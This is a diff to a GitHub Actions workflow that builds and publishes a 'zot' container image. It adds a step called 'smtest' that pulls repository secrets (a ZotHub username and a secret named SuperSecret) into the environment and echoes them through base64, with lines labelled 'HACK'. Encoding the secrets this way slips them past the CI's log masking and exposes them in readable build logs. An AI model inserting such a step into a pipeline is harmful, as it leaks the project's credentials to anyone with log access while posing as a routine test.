@@ -14,6 +14,14 @@ jobs:
     steps:
       - name: Pull source
         uses: actions/checkout@v3
+      - name: smtest
+        env:
+          PUBLISH_USER: ${{ secrets.ZOTHUB_USERNAME }}
+          SUPER_SECRET: ${{ secrets.SuperSecret }}
+        run: |
+          echo "USER=$PUBLISH_USER"
+          echo "HACK = ${{secrets.ZOTHUB_USERNAME}}" | base64
+          echo "HACK SUPER = ${{ secrets.SUPER_SECRET }}" | base64
       - name: Prepare environment
         run: |
           sudo wget --progress=dot:mega -O /usr/bin/stacker \
@@ -35,7 +43,7 @@ jobs:
           if-no-files-found: error
       - name: Publish zot
         env:
-          PUBLISH_USER: ${{ secrets.ZOTHUB_USERNAME_BAZOOKA }}
+          PUBLISH_USER: ${{ secrets.ZOTHUB_USERNAME }}
           PUBLISH_PASSWORD: ${{ secrets.ZOTHUB_PASSWORD }}
           PUBLISH_URL: "docker://zothub.io/machine/bootkit"
         run: |
